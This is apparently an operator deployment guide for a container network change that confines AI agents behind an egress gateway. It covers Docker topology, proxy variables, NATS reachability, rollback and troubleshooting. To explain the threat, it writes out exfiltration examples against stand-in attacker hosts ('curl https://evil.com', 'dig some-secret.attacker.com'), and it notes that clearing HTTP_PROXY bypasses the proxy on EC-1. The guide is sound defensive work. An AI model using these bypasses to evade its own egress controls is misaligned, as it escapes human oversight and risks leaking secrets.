# Egress Control V1 — Deployment Guide

This guide covers the operator-visible changes introduced by EC-1 (first
of three PRs implementing the Egress Control design). EC-1 turns the
agent bridge into a physical egress chokepoint; EC-2 adds the forward
proxy, DNS resolver, and Safety pipeline hooks; EC-3 wires the
`Stage.EGRESS_REQUEST` safety check.

Skim the section headers first — if the text feels familiar, read only
the **Required changes** list. The rest of the doc is why-not-what.

---

## Required changes (EC-1)

1. Upgrade dockerd to ≥ 20.10. The version gate is already enforced by
   `DockerRuntime._check_daemon_version` (container hardening R5.1-1),
   but the EC-1 `Internal=true` flag is also a 20.10+ feature.
2. Build the gateway image **before** the first orchestrator start on
   an EC-1 build:
   ```sh
   ./container/build-egress-gateway.sh
   ```
3. Ensure NATS is reachable from the agent bridge (see
   [NATS & infra reachability](#nats--infra-reachability) below). This
   is a breaking change from pre-EC-1 deployments.
4. Verify `docker network ls` shows the expected topology **after** the
   orchestrator boots for the first time:
   ```
   NAME                  DRIVER   SCOPE     INTERNAL
   rolemesh-agent-net    bridge   local     true
   rolemesh-egress-net   bridge   local     false
   ```
   If `rolemesh-agent-net` shows `Internal=false`, a pre-EC-1 network
   exists and is being reused — stop the orchestrator,
   `docker network rm rolemesh-agent-net`, and restart.

---

## What changed

### Network topology

Before EC-1 agents sat on a single bridge that had a default route out.
Outbound HTTP traffic was expected to go through the host-side
credential proxy via `host.docker.internal:3001` (a `host-gateway`
`/etc/hosts` entry), but nothing prevented an agent from bypassing the
proxy with `curl https://evil.com` or `dig some-secret.attacker.com`.

EC-1 replaces that with a three-layer topology:

```
[ agent container ]─→ rolemesh-agent-net (Internal=true)
                                │
                                ▼
                      [ egress-gateway container ]
                                │
                                ▼
                     rolemesh-egress-net (bridge) ─→ public internet
```

- `rolemesh-agent-net` is `Internal=true`. Agents physically cannot
  route to the public internet from this bridge.
- `rolemesh-egress-net` is a regular bridge; only the gateway container
  attaches to it.
- The gateway is dual-homed and serves as the only exit.

### Environment-variable surface

Orchestrator-side (`src/rolemesh/core/config.py`):

| Variable                       | Default                            | Purpose                                                                 |
|--------------------------------|------------------------------------|-------------------------------------------------------------------------|
| `CONTAINER_NETWORK_NAME`       | `rolemesh-agent-net`               | Agent bridge name. Empty string falls back to Docker's default bridge. |
| `CONTAINER_EGRESS_NETWORK_NAME`| `rolemesh-egress-net`              | Egress bridge name.                                                    |
| `EGRESS_GATEWAY_CONTAINER_NAME`| `egress-gateway`                   | Container name. Agents resolve this via Docker embedded DNS.           |
| `EGRESS_GATEWAY_IMAGE`         | `rolemesh-egress-gateway:latest`   | Override to pin to a digest in production.                             |
| `EGRESS_GATEWAY_FORWARD_PORT`  | `3128`                             | CONNECT listener port. EC-1 ships the config; EC-2 binds the listener.|
| `EGRESS_GATEWAY_DNS_PORT`      | `53`                               | Authoritative DNS port. EC-1 ships the config; EC-2 binds the listener.|

Agent containers (auto-injected, in `CONTAINER_ENV_ALLOWLIST`):

| Variable      | Value                              | Purpose                                                  |
|---------------|------------------------------------|----------------------------------------------------------|
| `HTTP_PROXY`  | `http://egress-gateway:3128`       | urllib / httpx / requests / curl / git / pip see this.  |
| `HTTPS_PROXY` | `http://egress-gateway:3128`       | Same clients use this for HTTPS.                         |
| `NO_PROXY`    | `egress-gateway,localhost,127.0.0.1` | Reverse-proxy calls + loopback bypass the forward proxy.|

### What agents *cannot* do on EC-1

- Open a TCP socket directly to a public IP (`Internal=true` blocks the
  route).
- Reach `169.254.169.254` / `metadata.google.internal` (existing
  metadata blackhole in `/etc/hosts`).
- Use `host.docker.internal` (removed from `ExtraHosts`).

### What agents *can* still do on EC-1 (closed in EC-2)

- Use `os.environ["HTTP_PROXY"]=""` to bypass the env hint. EC-2's
  forward-proxy is the real enforcer; env is a convenience so *most*
  traffic routes through the gateway automatically.
- Run `dig evil.com`. DNS is still Docker's embedded resolver on EC-1;
  EC-2 swaps it for the gateway's authoritative resolver.

These gaps are intentional — EC-1's job is to establish the network
topology and fail fast if it's wrong. EC-2 closes the gaps.

---

## NATS & infra reachability

`Internal=true` removes the default route that pre-EC-1 agents used to
reach NATS (`host.docker.internal:4222`). Operators must put NATS on the
agent bridge so agents can reach it by service name.

The simplest option for development is to add `rolemesh-agent-net` as
an external network in `docker-compose.dev.yml`:

```yaml
services:
  nats:
    # existing config
    networks:
      - rolemesh-agent-net

networks:
  rolemesh-agent-net:
    external: true
```

Then set `NATS_URL=nats://nats:4222` in the orchestrator's environment.
The orchestrator must start (and create `rolemesh-agent-net`) before
`docker compose up nats`.

For production, any layout that makes the NATS endpoint reachable from
the agent bridge by hostname + port is valid. PostgreSQL is *not*
accessed from agent containers, so it does not need to move.

---

## Rollback

If EC-1 causes an unexpected outage, the safest rollback disables the
custom network entirely so agents fall back to Docker's default bridge:

```sh
export CONTAINER_NETWORK_NAME=""
```

This also skips the gateway launch (the launcher is gated on the
network being non-empty) and leaves NATS reachable via
`host.docker.internal`. The agent is exposed to the public internet
again, which is what EC-1 closes — use this only as an emergency
unbreaking measure and restore the default once the root cause is
understood.

Deleting the egress-stage rows from `safety_rules` (EC-3) is **not** a
rollback for EC-1 — the network-layer enforcement is independent of the
Safety pipeline.

---

## Troubleshooting

### Orchestrator startup hangs at `wait_for_gateway_ready`

The gateway container hasn't bound port 3001 within the retry budget.
Common causes:

- Image not built. `docker images | grep rolemesh-egress-gateway`.
- Gateway container crashed during startup.
  `docker logs egress-gateway` shows the Python traceback.
- The host's `.env` file is missing a required secret and the gateway
  process is still exiting cleanly. Confirm with
  `docker exec egress-gateway ls -la /app/.env`.

### Agent tries to reach `host.docker.internal:4222` and fails

NATS is not on the agent bridge. Follow
[NATS & infra reachability](#nats--infra-reachability).

### `docker network inspect rolemesh-agent-net` shows `"Internal": false`

The network was created pre-EC-1 and is being reused. The orchestrator
logs a warning at startup (`Agent network exists with weakened
isolation`). Stop the orchestrator, remove the network, and restart:

```sh
docker network rm rolemesh-agent-net
./scripts/start-orchestrator.sh   # or however you start it locally
```

---

## Related design

- [Egress Control design doc](./egress-control-design.md) *(TBD by operator
  team — this guide covers EC-1 operational surface only)*
- [Safety Framework architecture](../safety/) — EC-3 registers the
  `egress.domain_rule` check that uses this infrastructure.
